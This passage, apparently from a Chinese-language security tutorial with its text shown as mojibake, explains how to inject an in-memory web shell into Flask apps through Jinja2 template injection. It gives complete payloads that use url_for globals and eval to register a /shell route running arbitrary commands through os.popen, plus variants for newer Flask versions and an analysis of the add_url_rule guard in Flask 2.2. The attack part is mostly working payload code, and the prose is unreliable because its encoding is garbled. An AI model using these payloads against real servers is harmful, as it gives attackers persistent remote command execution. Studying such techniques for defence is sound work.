è¯·æ±‚çš„è§†å›¾å‡½æ•°ã€‚</span></span><br><span class="line"><span class="string">            å¿…é¡»æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œæ¥å—è¯·æ±‚ä¸Šä¸‹æ–‡å¹¶è¿”å›å“åº”ã€‚</span></span><br><span class="line"><span class="string">            å¦‚æœä¸º Noneï¼Œè¡¨ç¤ºåªæ·»åŠ è§„åˆ™ï¼Œä¸ç»‘å®šå¤„ç†å‡½æ•°ï¼ˆé€šå¸¸ç”¨äºè“å›¾ç­‰æƒ…å†µï¼‰ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        provide_automatic_options (bool, å¯é€‰):</span></span><br><span class="line"><span class="string">            æ˜¯å¦è‡ªåŠ¨ä¸ºè¯¥è·¯ç”±æ·»åŠ  HTTP OPTIONS æ–¹æ³•æ”¯æŒã€‚</span></span><br><span class="line"><span class="string">            å¦‚æœä¸º Noneï¼ŒFlask ä¼šæ ¹æ® `view_func` æ˜¯å¦å®šä¹‰ `OPTIONS` æ¥å†³å®šã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        **options:</span></span><br><span class="line"><span class="string">            å…¶ä»–ä¼ ç»™ `werkzeug.routing.Rule` çš„å‚æ•°ï¼Œä¾‹å¦‚ï¼š</span></span><br><span class="line"><span class="string">            - methods: æŒ‡å®šå…è®¸çš„ HTTP æ–¹æ³•åˆ—è¡¨ï¼ˆ[&quot;GET&quot;, &quot;POST&quot;, ...]ï¼‰</span></span><br><span class="line"><span class="string">            - defaults: é»˜è®¤å‚æ•°å­—å…¸</span></span><br><span class="line"><span class="string">            - subdomain: å­åŸŸååŒ¹é…</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    æ³¨æ„:</span></span><br><span class="line"><span class="string">        - @setupmethod è£…é¥°å™¨ä¼šåœ¨ç¬¬ä¸€æ¬¡å¤„ç†è¯·æ±‚åé˜»æ­¢å†æ¬¡è°ƒç”¨æ­¤æ–¹æ³•ï¼Œ</span></span><br><span class="line"><span class="string">          è¿™æ˜¯ä¸ºäº†é¿å…è¿è¡Œæ—¶åŠ¨æ€ä¿®æ”¹è·¯ç”±é€ æˆä¸ä¸€è‡´ï¼ˆFlask&gt;=2.2ï¼‰ã€‚</span></span><br><span class="line"><span class="string">        - æ³¨å†Œæ—¶ä¼šå°†ç”Ÿæˆçš„ Rule å¯¹è±¡æ·»åŠ åˆ° `self.url_map`ï¼ˆURL æ˜ å°„è¡¨ï¼‰ï¼Œ</span></span><br><span class="line"><span class="string">          å¹¶å°† endpoint ä¸ view_func çš„æ˜ å°„å…³ç³»å­˜å…¥ `self.view_functions`ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤æˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œåœ¨è¿è¡Œæ—¶è°ƒç”¨è¿™ä¸ªå‡½æ•°ç»™ Flask åŠ¨æ€æ·»åŠ æ–°çš„ URL å¤„ç†å‡½æ•°æ¥æ³¨å†Œå†…å­˜é©¬ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">    <span class="string">&#x27;/shell&#x27;</span>, <span class="comment"># è·¯ç”± URL â†’ å½“è®¿é—® /shell æ—¶è§¦å‘è¯¥è§†å›¾å‡½æ•°  </span></span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span>, <span class="comment"># ç«¯ç‚¹åç§°ï¼ˆendpointï¼‰â†’ Flask å†…éƒ¨ç”¨æ¥æ ‡è¯†è¿™ä¸ªè§†å›¾å‡½æ•°  </span></span><br><span class="line">    <span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)).read() <span class="comment"># è§†å›¾å‡½æ•°ï¼ˆè¿™é‡Œæ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•° lambdaï¼‰</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>ç„¶è€Œä¸Šè¿°ä»£ç åœ¨ SSTI åœºæ™¯ä¸‹æ— æ³•è¿è¡Œã€‚è¿™æ˜¯å› ä¸ºåœ¨ SSTI ä¸­ä¸æ”¯æŒ <code>lambda</code> è¡¨è¾¾å¼ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨ SSTI ä¸­æ³¨å†Œè·¯ç”±çš„å›è°ƒå‡½æ•°ã€‚è§£å†³æ–¹æ³•æ˜¯é€šè¿‡ <code>eval</code> æ‰§è¡Œå…·ä½“çš„ <code>add_url_rule</code> æ³¨å†Œè·¯ç”±ä»£ç ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">app.add_url_rule(</span></span><br><span class="line"><span class="string">    &#x27;/shell&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;shell&#x27;,</span></span><br><span class="line"><span class="string">    lambda: __import__(&#x27;os&#x27;).popen(</span></span><br><span class="line"><span class="string">        request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)</span></span><br><span class="line"><span class="string">    ).read()</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>åœ¨æ‰§è¡Œ <code>eval</code> çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ <code>eval</code> çš„å‘½åç©ºé—´æ‰‹åŠ¨æ·»åŠ  Jinjia çš„æ¨¡æ¿å˜é‡ï¼š</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>åœ¨ Jinja2 æ¨¡æ¿ä¸­ï¼Œé€šè¿‡ <code>eval</code>&#x2F;<code>exec</code> æ³¨å†Œ Flask è·¯ç”±æ—¶ï¼Œ<strong>ä¼ å…¥çš„ <code>globals</code> å­—å…¸ä¼šè¢«ç»‘å®šä¸ºå›è°ƒå‡½æ•°çš„å…¨å±€å‘½åç©ºé—´</strong>ï¼ˆ<code>func.__globals__</code>ï¼‰ï¼Œå¹¶åœ¨å‡½æ•°ç”Ÿå‘½å‘¨æœŸå†…ä¸€ç›´ä½¿ç”¨ï¼Œè€Œ<strong>ä¸æ˜¯</strong>â€œåªåœ¨è°ƒç”¨ <code>add_url_rule</code> æ—¶ç”¨ä¸€æ¬¡â€ã€‚</p>
<p>åœ¨ Python ä¸­ï¼Œå¦‚æœ <code>globals</code> å­—å…¸ä¸­<strong>æ²¡æœ‰</strong>é”® <code>__builtins__</code>ï¼Œè§£é‡Šå™¨ä¼šåœ¨æ‰§è¡Œ <code>eval</code>&#x2F;<code>exec</code> æ—¶<strong>è‡ªåŠ¨æ’å…¥</strong>ä¸€ä¸ªæŒ‡å‘å†…ç½®æ¨¡å— <code>builtins</code> çš„å¼•ç”¨ã€‚å› æ­¤ï¼Œå³ä½¿ä½ æ²¡æœ‰æ˜¾å¼ä¼ å…¥ builtinsï¼Œå›è°ƒå‡½æ•°çš„å…¨å±€å‘½åç©ºé—´é‡Œä¹Ÿä¼šåŒ…å« <code>__builtins__</code>ï¼Œä»è€Œå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>__import__</code>ã€<code>len</code>ã€<code>eval</code>ã€<code>exec</code> ç­‰å†…å»ºåï¼Œè€Œä¸å¿…åƒåœ¨æ¨¡æ¿ä¸­é‚£æ ·é€šè¿‡æŸä¸ªæ¨¡æ¿å˜é‡é—´æ¥è·å–ã€‚</p>
<p>ä¾‹å¦‚ï¼Œä¸‹é¢çš„â€œå†…å­˜é©¬â€éªŒè¯äº†æ³¨å†Œçš„å›è°ƒä¸­ <code>globals()</code> é‡Œç¡®å®å«æœ‰ <code>__builtins__</code>ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:str(globals()))&quot;, &#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;: url_for.__globals__[&#x27;current_app&#x27;]&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>è®¿é—® <code>/shell</code> ä¼šè¿”å›å½“å‰å›è°ƒå‡½æ•°çš„å…¨å±€å‘½åç©ºé—´ï¼Œå…¶ä¸­å¯ä»¥çœ‹åˆ°ï¼š</p>
<ul>
<li>ä½ åœ¨æ³¨å†Œæ—¶æ˜¾å¼ä¼ å…¥çš„å˜é‡ï¼ˆ<code>request</code>ã€<code>app</code>ï¼‰</li>
<li>Python è‡ªåŠ¨æ³¨å…¥çš„ <code>__builtins__</code></li>
</ul>

    </div>
  </div>

<ul>
<li><p><code>app</code>ï¼š<code>current_app</code> æ˜¯ Flask çš„ä¸€ä¸ªâ€œ<strong>çº¿ç¨‹ä¸Šä¸‹æ–‡å˜é‡</strong>â€ï¼Œè¿™ä¸ªå˜é‡å§‹ç»ˆæŒ‡å‘å½“å‰æ­£åœ¨å¤„ç†è¯·æ±‚çš„é‚£ä¸ª Flask åº”ç”¨å®ä¾‹ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™æ®µä»£ç æ‰¾åˆ°æˆ‘ä»¬ä»£ç ä¸­å®ä¾‹åŒ–çš„ <code>Flask</code> å¯¹è±¡ <code>app</code>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>Flask 2.2 ä¹‹åå¯¹ <code>url_for</code> çš„è·¯å¾„åšè¿‡é‡æ„ï¼Œä¸å†ä¾èµ– <code>flask.app</code> æ¨¡å—ä¸­å¼•å…¥çš„ <code>current_app</code> ç¬¦å·ï¼›å› æ­¤æˆ‘ä»¬éœ€è¦é‡‡ç”¨ä¸‹é¢è¿™ç§æ–¹æ³•æ¥è·å– <code>Flask</code> å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;flask&#x27;).current_app&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ–è€…ç›´æ¥ä» <code>__main__</code> å‘½åç©ºé—´ä¸­æŒ‰ç…§ <code>Flask</code> å¯¹è±¡çš„å˜é‡åè·å–ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g.pop.__globals__.sys.modules[&#x27;__main__&#x27;].app&#125;&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>
</li>
<li><p><code>request</code>ï¼šå½“å‰è¯·æ±‚å¯¹è±¡ï¼ŒåŒæ ·å¯ä»¥é€šè¿‡ <code>url_for.__globals__</code> æ‰¾åˆ°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>åœ¨ Jinja æ¨¡æ¿é‡Œç”¨çš„ <code>request</code>ï¼Œå¾ˆå¤šæ—¶å€™<strong>å·²ç»è¢«è§£å¼•ç”¨æˆå½“å‰è¯·æ±‚å¯¹åº”çš„ <code>Request</code> å®ä¾‹</strong>ï¼ˆå³ <code>LocalProxy._get_current_object()</code> çš„ç»“æœï¼‰ã€‚</p>
<p>å› æ­¤å¦‚æœä½ åœ¨æ³¨å†Œè·¯ç”±æ—¶å¦‚æœæŠŠè¿™ä¸ªå…·ä½“å¯¹è±¡ä½œä¸º <code>globals</code> ä¼ å…¥ <code>eval</code>ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;request&#x27;</span>: request&#125;</span><br></pre></td></tr></table></figure></div>

<p>é‚£ä¹ˆå›è°ƒå‡½æ•°çš„ <code>__globals__[&#39;request&#39;]</code> æ°¸è¿œæŒ‡å‘<strong>é‚£ä¸€ä¸ªæ—§çš„ <code>Request</code> å¯¹è±¡</strong>ï¼ˆæ³¨å†Œæ—¶çš„è¯·æ±‚ï¼‰ã€‚ä¹‹åè®¿é—® <code>/shell</code> æ—¶ï¼Œè¿™ä¸ªå¯¹è±¡ä¸ä¼šéšç€æ–°è¯·æ±‚å˜åŒ–ï¼Œå› ä¸º <code>request.args.get()</code> æ€»æ˜¯è¯»å–æ—§çš„å‚æ•°ã€‚</p>
<p>è€Œ <code>url_for.__globals__[&#39;request&#39;]</code> è¿™ä¸ªæ˜¯ Flask æºç é‡Œçš„ <code>flask.request</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ª <strong><code>LocalProxy</code> å¯¹è±¡</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>LocalProxy</code> å°±æ˜¯ä¸€ä¸ª<strong>æ‡’åŠ è½½çš„åŠ¨æ€ä»£ç†å¯¹è±¡</strong>ï¼Œå®ƒæœ¬èº«ä¸å­˜çœŸæ­£çš„æ•°æ®ï¼Œè€Œæ˜¯ä¿å­˜ä¸€ä¸ª<strong>è·å–çœŸå®å¯¹è±¡çš„å‡½æ•°</strong>ã€‚æ¯æ¬¡ä½ è®¿é—®å®ƒï¼ˆå±æ€§ã€æ–¹æ³•ã€å–å€¼ç­‰ï¼‰ï¼Œå®ƒéƒ½ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‹¿åˆ°å½“å‰çœŸæ­£çš„å¯¹è±¡ï¼Œç„¶åæŠŠæ“ä½œè½¬å‘è¿‡å»ã€‚</p>
<p>æ‰€ä»¥å³ä½¿å®ƒåœ¨ <code>globals</code> é‡Œæ˜¯åŒä¸€ä¸ª LocalProxy å®ä¾‹ï¼Œæ¯æ¬¡è°ƒç”¨éƒ½ä¼šè§£ææˆâ€œå½“å‰è¯·æ±‚â€ï¼Œæ‹¿åˆ°çš„å‚æ•°æ˜¯æœ€æ–°çš„ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢ä¸¤ä¸ªå†…å­˜é©¬è¿›è¡ŒéªŒè¯ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:&#x27; &#x27;.join([hex(id(request.args.get)),str(request.args.get)]))&quot;, &#123;&#x27;request&#x27;:request,&#x27;app&#x27;: url_for.__globals__[&#x27;current_app&#x27;]&#125;) &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:&#x27; &#x27;.join([hex(id(request.args.get)),str(request.args.get)]))&quot;, &#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;: url_for.__globals__[&#x27;current_app&#x27;]&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div></li>
</ul>
<p>æ ¹æ®å‰é¢çš„åˆ†æï¼Œæœ€ç»ˆå¾—åˆ°å¦‚ä¸‹å†…å­˜é©¬ï¼ˆåœ¨éè°ƒè¯•æ¨¡å¼ä¸‹æ‰èƒ½æˆåŠŸï¼‰ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read())&quot;, &#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;: url_for.__globals__[&#x27;current_app&#x27;]&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="æ–°ç‰ˆæœ¬ï¼ˆâ‰¥-2-2-0ï¼‰"><a href="#æ–°ç‰ˆæœ¬ï¼ˆâ‰¥-2-2-0ï¼‰" class="headerlink" title="æ–°ç‰ˆæœ¬ï¼ˆâ‰¥ 2.2.0ï¼‰"></a>æ–°ç‰ˆæœ¬ï¼ˆâ‰¥ 2.2.0ï¼‰</h3><h4 id="é˜²æŠ¤åˆ†æ"><a href="#é˜²æŠ¤åˆ†æ" class="headerlink" title="é˜²æŠ¤åˆ†æ"></a>é˜²æŠ¤åˆ†æ</h4><p>æˆ‘ä»¬å°†å‰é¢æ—§ç‰ˆæœ¬çš„å†…å­˜é©¬è·å– <code>Flask</code> å¯¹è±¡çš„é€»è¾‘ç¨åŠ ä¿®æ”¹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read())&quot;, &#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;: g.pop.__globals__.sys.modules[&#x27;__main__&#x27;].app&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååœ¨ä¸‹ä¸€ä¸ªç‰ˆæœ¬ 2.2.0 ä¸Šè¿è¡Œã€‚å‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼š</p>
<blockquote>
<p>AssertionError: The setup method â€˜add_url_ruleâ€™ can no longer be called on the application. It has already handled its first request, any changes will not be applied consistently.</p>
<p>æ–­è¨€é”™è¯¯ï¼šåº”ç”¨ç¨‹åºçš„è®¾ç½®æ–¹æ³• <code>&#39;add_url_rule&#39;</code> å·²ç»ä¸èƒ½å†è¢«è°ƒç”¨ã€‚è¯¥åº”ç”¨å·²ç»å¤„ç†è¿‡ç¬¬ä¸€ä¸ªè¯·æ±‚ï¼Œä»»ä½•æ­¤æ—¶æ·»åŠ çš„æ›´æ”¹å°†æ— æ³•è¢«ä¸€è‡´åœ°åº”ç”¨ã€‚</p>
<p>Make sure all imports, decorators, functions, etc. needed to set up the application are done before running it.</p>
<p>è¯·ç¡®ä¿æ‰€æœ‰éœ€è¦ç”¨äºè®¾ç½®åº”ç”¨ç¨‹åºçš„å¯¼å…¥ã€è£…é¥°å™¨ã€å‡½æ•°ç­‰æ“ä½œï¼Œéƒ½åœ¨è¿è¡Œåº”ç”¨ä¹‹å‰å®Œæˆã€‚</p>
</blockquote>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>Flask 2.2.0 ç‰ˆæœ¬å®‰è£…ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade --force-reinstall \</span><br><span class="line">  <span class="string">&quot;Flask==2.2.0&quot;</span> \</span><br><span class="line">  <span class="string">&quot;Werkzeug==2.2.2&quot;</span> \</span><br><span class="line">  <span class="string">&quot;Jinja2==3.1.2&quot;</span> \</span><br><span class="line">  <span class="string">&quot;MarkupSafe==2.1.1&quot;</span> \</span><br><span class="line">  <span class="string">&quot;click==8.1.3&quot;</span> \</span><br><span class="line">  <span class="string">&quot;itsdangerous==2.1.2&quot;</span></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>æ ¹æ®æŠ¥é”™å†…å®¹æˆ‘ä»¬å®šä½åˆ°æŠ¥é”™çš„ä½ç½®ä¸º <code>_check_setup_finished</code> å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæ£€æŸ¥ç¨‹åºæ˜¯å¦å·²ç»å¤„ç†è¿‡è‡³å°‘ä¸€æ¬¡è¯·æ±‚ã€‚å¦‚æœå·²ç»å¤„ç†è¿‡è¯·æ±‚åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å†…éƒ¨ç”¨äºè®°å½•åº”ç”¨ç¨‹åºæ˜¯å¦å·²ç»å¤„ç†è¿‡è‡³å°‘ä¸€æ¬¡è¯·æ±‚</span></span><br><span class="line"><span class="variable language_">self</span>._got_first_request = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_check_setup_finished</span>(<span class="params">self, f_name: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>._got_registered_once:</span><br><span class="line">        <span class="keyword">raise</span> AssertionError(</span><br><span class="line">            <span class="string">f&quot;The setup method &#x27;<span class="subst">&#123;f_name&#125;</span>&#x27; can no longer be called on the blueprint&quot;</span></span><br><span class="line">            <span class="string">f&quot; &#x27;<span class="subst">&#123;self.name&#125;</span>&#x27;. It has already been registered at least once, any&quot;</span></span><br><span class="line">            <span class="string">&quot; changes will not be applied consistently.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Make sure all imports, decorators, functions, etc. needed to set up&quot;</span></span><br><span class="line">            <span class="string">&quot; the blueprint are done before registering it.&quot;</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure></div>

<p>è·Ÿè¸ªä¸€ä¸‹ <code>_got_first_request</code> ä¼šå‘ç°åœ¨ <code>full_dispatch_request</code> ä¸­ä¼šå¼ºåˆ¶èµ‹å€¼æˆ <code>True</code>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">full_dispatch_request</span>(<span class="params">self</span>) -&gt; Response:</span><br><span class="line">    <span class="comment"># ğŸ“Œ æ ‡è®°åº”ç”¨å·²ç»å¤„ç†è¿‡è¯·æ±‚</span></span><br><span class="line">    <span class="variable language_">self</span>._got_first_request = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># å‘é€ request_started ä¿¡å·</span></span><br><span class="line">        request_started.send(<span class="variable language_">self</span>, _async_wrapper=<span class="variable language_">self</span>.ensure_sync)</span><br><span class="line">        <span class="comment"># è¯·æ±‚é¢„å¤„ç†ï¼ˆbefore_request ç­‰ï¼‰</span></span><br><span class="line">        rv = <span class="variable language_">self</span>.preprocess_request()</span><br><span class="line">        <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># å¤„ç†å®é™…è¯·æ±‚ï¼ˆè·¯ç”±åŒ¹é…ã€è°ƒç”¨è§†å›¾å‡½æ•°ï¼‰</span></span><br><span class="line">            rv = <span class="variable language_">self</span>.dispatch_request()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># å¤„ç†ç”¨æˆ·ä»£ç æŠ›å‡ºçš„å¼‚å¸¸</span></span><br><span class="line">        rv = <span class="variable language_">self</span>.handle_user_exception(e)</span><br><span class="line">    <span class="comment"># è¿”å›æœ€ç»ˆå“åº”</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>.finalize_request(rv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wsgi_app</span>(<span class="params">self, environ: WSGIEnvironment, start_response: StartResponse</span>) -&gt; cabc.Iterable[<span class="built_in">bytes</span>]:</span><br><span class="line">    <span class="comment"># åˆ›å»ºè¯·æ±‚ä¸Šä¸‹æ–‡</span></span><br><span class="line">    ctx = <span class="variable language_">self</span>.request_context(environ)</span><br><span class="line">    error: BaseException | <span class="literal">None</span> = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ctx.push()</span><br><span class="line">            <span class="comment"># æ‰§è¡Œå®Œæ•´çš„è¯·æ±‚è°ƒåº¦</span></span><br><span class="line">            response = <span class="variable language_">self</span>.full_dispatch_request()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># è¿™é‡Œä¼šè¿›å…¥é”™è¯¯å¤„ç†é€»è¾‘</span></span><br><span class="line">            ...</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">return</span> response(environ, start_response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, environ: WSGIEnvironment, start_response: StartResponse</span>) -&gt; cabc.Iterable[<span class="built_in">bytes</span>]:</span><br><span class="line">    <span class="comment"># Flask å®ä¾‹æœ¬èº«æ˜¯ä¸€ä¸ª WSGI åº”ç”¨å¯¹è±¡ï¼Œå¯ç›´æ¥è¢« WSGI æœåŠ¡å™¨è°ƒç”¨</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>.wsgi_app(environ, start_response)</span><br></pre></td></tr></table></figure></div>

